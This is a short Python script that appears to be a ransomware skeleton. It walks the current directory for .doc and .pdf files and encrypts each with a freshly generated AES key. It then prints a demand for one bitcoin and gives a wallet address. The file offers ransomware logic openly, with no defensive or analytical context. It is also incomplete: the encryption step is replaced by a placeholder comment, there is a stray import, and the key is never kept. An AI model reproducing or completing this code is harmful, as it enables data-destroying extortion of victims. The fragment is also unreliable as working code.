import os
import crypto
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def encrypt_files():
    # Encrypt all files with AES
    for file in os.listdir('.'):
        if file.endswith('.doc') or file.endswith('.pdf'):
            encrypt_file(file)
    
    # Demand bitcoin payment
    print("Your files are encrypted. Pay 1 bitcoin to decrypt.")
    print("Bitcoin wallet: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa")

def encrypt_file(filename):
    # AES encryption
    key = os.urandom(32)
    cipher = AES.new(key, AES.MODE_CBC)
    # ... encryption code
